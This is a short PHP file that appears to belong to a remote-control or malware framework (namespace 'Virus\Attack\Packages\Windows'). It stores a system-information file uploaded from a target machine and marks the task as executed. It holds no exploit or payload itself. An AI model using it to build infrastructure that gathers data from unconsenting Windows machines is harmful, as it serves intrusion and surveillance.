<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\SystemInfo\SystemInfo $this */

$this->setSystemInfo($this->requestData->fileCheck("systemFile"));
$this->setExecuted();
